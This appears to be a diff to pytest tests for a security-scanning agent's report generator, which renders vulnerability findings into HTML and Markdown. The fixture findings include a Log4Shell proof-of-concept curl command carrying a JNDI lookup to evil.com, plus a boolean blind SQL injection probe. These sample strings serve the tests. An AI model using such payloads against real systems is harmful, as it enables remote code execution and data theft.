@@ -3,6 +3,7 @@
 from __future__ import annotations
 
 import importlib.util
+import json
 import sys
 from pathlib import Path
 from types import ModuleType
@@ -11,11 +12,11 @@ import pytest
 
 from secbot.agent.asset_feed import AssetFeed
 from secbot.agent.tools.skill import bind_skill_context
+from secbot.agent.vulnerability_store import VulnerabilityStore
 from secbot.cmdb import db as cmdb_db
 from secbot.cmdb.models import Base
 from secbot.cmdb.repo import (
     create_scan,
-    get_scan,
     list_assets,
     update_scan_status,
     upsert_asset,
@@ -145,7 +146,7 @@ async def test_render_markdown_contains_key_fields(cmdb_engine):
     # New fields
     assert "验证步骤" in md
     assert "Send POST request to /api/login with JNDI payload" in md
-    assert "证据详情" in md
+    assert "PoC 证据详情" in md or "证据详情" in md
     assert "修复建议" in md
     assert "Upgrade Log4j to 2.17.0+" in md
     assert "参考资料" in md
@@ -167,7 +168,7 @@ async def test_render_html_inlines_severity_badges(cmdb_engine):
     assert "finding-card" in html
     assert "验证步骤" in html
     assert "Send POST request to /api/login with JNDI payload" in html
-    assert "证据详情" in html
+    assert "PoC 请求" in html or "系统响应" in html or "证据详情" in html
     assert "修复建议" in html
     assert "Upgrade Log4j to 2.17.0+" in html
     assert "参考资料" in html
@@ -264,19 +265,45 @@ def _ctx(tmp_path: Path) -> SkillContext:
 
 
 async def test_report_html_skill_writes_file(cmdb_engine, tmp_path: Path):
-    scan_id = await _seed()
+    """report-html uses VulnerabilityStore as primary data source."""
+    scan_id = "vuln-store-scan"
+    store = VulnerabilityStore()
+    await store.report(
+        agent_name="nuclei-template-scan",
+        title="Log4Shell RCE via JNDI injection",
+        severity="critical",
+        description="Remote code execution via JNDI lookup injection in user-agent header",
+        exploitation_proof="POST /api/login HTTP/1.1\nHost: 10.0.0.5:8080\n\nHTTP/1.1 500 Internal Server Error",
+        verification_method="automated_scan",
+        cvss=9.8,
+        endpoint="http://10.0.0.5:8080/api/login",
+        poc_script_code="curl -X POST http://10.0.0.5:8080/api/login -H 'User-Agent: ${jndi:ldap://evil.com/exploit}'",
+        remediation_steps="Upgrade Log4j to 2.17.0+",
+    )
+    await store.report(
+        agent_name="fscan-vuln-scan",
+        title="Exposed Git repository configuration",
+        severity="medium",
+        description="Git repository configuration file publicly accessible at /.git/config",
+        exploitation_proof="GET /.git/config HTTP/1.1\n\nHTTP/1.1 200 OK\n[core]\nrepositoryformatversion = 0",
+        verification_method="automated_scan",
+        endpoint="http://10.0.0.5/.git/config",
+    )
+
     mod = _load("report-html")
     ctx = _ctx(tmp_path)
-    bind_skill_context(scan_id=scan_id, scan_dir=ctx.scan_dir)
+    bind_skill_context(
+        scan_id=scan_id, scan_dir=ctx.scan_dir, vulnerability_store=store
+    )
     res = await mod.run({}, ctx)
     assert res.summary["status"] == "ok"
+    assert res.summary["source"] == "vulnerability_store"
     out = Path(res.summary["report_path"])
     assert out.exists()
     assert out.name == "report.html"
     text = out.read_text(encoding="utf-8")
     assert "<!DOCTYPE html>" in text
     assert "Log4Shell" in text
-    assert res.summary["asset_count"] == 1
     assert res.summary["finding_count"] == 2
 
 
@@ -294,43 +321,38 @@ async def test_report_html_skill_empty_scan(cmdb_engine, tmp_path: Path):
     assert res.summary["finding_count"] == 0
 
 
-async def test_report_html_skill_uses_asset_feed_when_cmdb_empty(
+async def test_report_html_skill_uses_vulnerability_store_entries(
     cmdb_engine,
     tmp_path: Path,
 ):
+    """report-html renders VulnerabilityStore entries when CMDB is empty."""
     scan_id = "websocket_111"
-    feed = AssetFeed()
-    await feed.append(
-        kind="tech",
-        agent_name="crawl_web",
-        payload={"host": "111.228.2.47:8080", "stack": ["PHP", "Apache"]},
-    )
-    await feed.append(
-        kind="vuln",
+    store = VulnerabilityStore()
+    await store.report(
         agent_name="vuln_scan",
-        payload={
-            "url": "http://111.228.2.47:8080/vul/sqli/sqli_id.php",
-            "param": "id (POST)",
-            "type": "sqli_boolean_blind",
-            "severity": "critical",
-            "evidence": "sqlmap-detect: AND boolean-based blind",
-            "status": "confirmed",
-        },
+        title="Boolean-based blind SQL injection in id parameter",
+        severity="critical",
+        description="sqlmap-detect confirmed boolean-based blind SQL injection on id POST parameter",
+        exploitation_proof="POST /vul/sqli/sqli_id.php HTTP/1.1\n\nid=1 AND 3327=3327\n\nHTTP/1.1 200 OK (response confirms injection)",
+        verification_method="automated_scan",
+        endpoint="http://111.228.2.47:8080/vul/sqli/sqli_id.php",
+        poc_description="id=1 AND 3327=3327",
     )
-    await feed.append(
-        kind="vuln",
+    await store.report(
         agent_name="vuln_scan",
-        payload={
-            "url": "http://111.228.2.47:8080/.git/config",
-            "type": "git_repo_exposed",
-            "severity": "medium",
-            "evidence": "nuclei-template-scan: Git Configuration - Detect",
-        },
+        title="Git configuration file exposed",
+        severity="medium",
+        description="nuclei-template-scan: Git Configuration - Detect",
+        exploitation_proof="GET /.git/config HTTP/1.1\n\nHTTP/1.1 200 OK\n[core]",
+        verification_method="automated_scan",
+        endpoint="http://111.228.2.47:8080/.git/config",
     )
 
     mod = _load("report-html")
     ctx = _ctx(tmp_path)
-    bind_skill_context(scan_id=scan_id, scan_dir=ctx.scan_dir, asset_feed=feed)
+    bind_skill_context(
+        scan_id=scan_id, scan_dir=ctx.scan_dir, vulnerability_store=store
+    )
 
     res = await mod.run(
         {
@@ -342,65 +364,167 @@ async def test_report_html_skill_uses_asset_feed_when_cmdb_empty(
     )
 
     assert res.summary["status"] == "ok"
-    assert res.summary["asset_count"] == 1
+    assert res.summary["source"] == "vulnerability_store"
     assert res.summary["finding_count"] == 2
     out = Path(res.summary["report_path"])
     assert out.exists()
     text = out.read_text(encoding="utf-8")
     assert "111.228.2.47:8080" in text
-    assert "sqli_boolean_blind" in text
-    assert "Git Configuration" in text
+    assert "SQL injection" in text
+    assert "Git configuration" in text
 
+    # CMDB should remain untouched (no CMDB writes from VulnerabilityStore path)
     async with cmdb_db.get_session() as session:
-        scan = await get_scan(session, "local", scan_id)
-        assert scan is not None
         assert await list_assets(session, "local", scan_id=scan_id) == []
 
 
-async def test_report_html_asset_feed_wins_over_historical_scan(
+async def test_report_html_merges_vulnerability_store_and_jsonl(
     cmdb_engine,
     tmp_path: Path,
 ):
+    """VulnerabilityStore and session JSONL discoveries are merged."""
     target = "http://111.228.2.47:8080"
-    async with cmdb_db.get_session() as session:
-        hist_scan = await create_scan(session, "local", target=target)
-        hist_asset = await upsert_asset(
-            session,
-            "local",
-            scan_id=hist_scan.id,
-            target="111.228.2.47:8080",
-        )
-        await upsert_vulnerability(
-            session,
-            "local",
-            asset_id=hist_asset.id,
-            severity="critical",
-            category="cve",
-            title="Historical stale finding",
-            discovered_by="nuclei-template-scan",
-        )
 
-    feed = AssetFeed()
-    await feed.append(
-        kind="vuln",
+    store = VulnerabilityStore()
+    await store.report(
         agent_name="vuln_scan",
-        payload={
-            "url": "http://111.228.2.47:8080/current.php",
-            "type": "sqli_boolean_blind",
-            "severity": "critical",
-            "title": "Current feed finding",
-            "evidence": "current session evidence",
-        },
+        title="Current store finding",
+        severity="critical",
+        description="Active vulnerability found in current scan session",
+        exploitation_proof="GET /current.php?id=1 HTTP/1.1\n\nHTTP/1.1 200 OK (SQL error reflected)",
+        verification_method="automated_scan",
+        endpoint="http://111.228.2.47:8080/current.php",
     )
 
     mod = _load("report-html")
     ctx = _ctx(tmp_path)
-    bind_skill_context(scan_id="websocket_current", scan_dir=ctx.scan_dir, asset_feed=feed)
+    sessions_dir = tmp_path / "sessions"
+    sessions_dir.mkdir()
+    (sessions_dir / "websocket_current.jsonl").write_text(
+        json.dumps(
+            {
+                "_kind": "agent_event",
+                "timestamp": "2026-06-12T12:00:00+00:00",
+                "sender_id": "vuln_scan",
+                "agent_event": {
+                    "type": "tool_call",
+                    "status": "ok",
+                    "tool_name": "asset_push",
+                    "tool_call_id": "call-batch-vuln",
+                    "agent_name": "vuln_scan",
+                    "tool_args": {
+                        "kind": "vuln",
+                        "payloads": [
+                            {
+                                "url": "http://111.228.2.47:8080/.git/config",
+                                "type": "git_repo_exposed",
+                                "severity": "medium",
+                                "evidence": "[core] repositoryformatversion = 0",
+                            },
+                            {
+                                "url": "http://111.228.2.47:8080/Dockerfile",
+                                "type": "dockerfile_disclosure",
+                                "severity": "low",
+                                "evidence": "FROM php:apache",
+                            },
+                        ],
+                    },
+                },
+            },
+            ensure_ascii=False,
+        )
+        + "\n",
+        encoding="utf-8",
+    )
+    bind_skill_context(
+        scan_id="websocket_current",
+        scan_dir=ctx.scan_dir,
+        vulnerability_store=store,
+    )
 
     res = await mod.run({"target": target, "type": "vuln"}, ctx)
 
     assert res.summary["status"] == "ok"
-    assert res.summary["finding_count"] == 1
+    assert res.summary["source"] == "vulnerability_store+session_jsonl"
+    assert res.summary["finding_count"] == 3
     text = Path(res.summary["report_path"]).read_text(encoding="utf-8")
-    assert "Current feed finding" in text
-    assert "Historical stale finding" not in text
+    assert "Current store finding" in text
+    assert "git_repo_exposed" in text
+    assert "dockerfile_disclosure" in text
+
+
+async def test_report_html_blocks_normal_report_when_subagent_interrupted(
+    cmdb_engine,
+    tmp_path: Path,
+):
+    """Normal reports do not run when latest upstream work is interrupted."""
+    scan_id = "websocket_interrupted"
+    sessions_dir = tmp_path / "sessions"
+    sessions_dir.mkdir()
+    (sessions_dir / f"{scan_id}.jsonl").write_text(
+        "\n".join(
+            [
+                json.dumps(
+                    {
+                        "_kind": "agent_event",
+                        "timestamp": "2026-06-12T12:00:00+00:00",
+                        "sender_id": "vuln_scan",
+                        "agent_event": {
+                            "type": "subagent_done",
+                            "task_id": "task-1",
+                            "agent_name": "vuln_scan",
+                            "label": "vuln_scan",
+                            "status": "incomplete",
+                        },
+                    },
+                    ensure_ascii=False,
+                ),
+                json.dumps(
+                    {
+                        "_kind": "agent_event",
+                        "timestamp": "2026-06-12T12:01:00+00:00",
+                        "sender_id": "vuln_scan",
+                        "agent_event": {
+                            "type": "tool_call",
+                            "status": "ok",
+                            "tool_name": "asset_push",
+                            "tool_call_id": "call-vuln",
+                            "agent_name": "vuln_scan",
+                            "tool_args": {
+                                "kind": "vuln",
+                                "payload": {
+                                    "url": "http://example.test/.git/config",
+                                    "type": "git_repo_exposed",
+                                    "severity": "medium",
+                                    "evidence": "[core]",
+                                },
+                            },
+                        },
+                    },
+                    ensure_ascii=False,
+                ),
+            ]
+        )
+        + "\n",
+        encoding="utf-8",
+    )
+
+    mod = _load("report-html")
+    ctx = _ctx(tmp_path)
+    bind_skill_context(scan_id=scan_id, scan_dir=ctx.scan_dir)
+
+    blocked = await mod.run({"target": "http://example.test"}, ctx)
+
+    assert blocked.summary["status"] == "blocked_interrupted_dependencies"
+    assert blocked.summary["report_path"] is None
+    assert blocked.summary["interrupted_agents"][0]["agent_name"] == "vuln_scan"
+
+    partial = await mod.run(
+        {"target": "http://example.test", "allow_partial": True},
+        ctx,
+    )
+
+    assert partial.summary["status"] == "ok"
+    assert partial.summary["partial"] is True
+    assert partial.summary["finding_count"] == 1
+    assert partial.summary["interrupted_agents"][0]["agent_name"] == "vuln_scan"
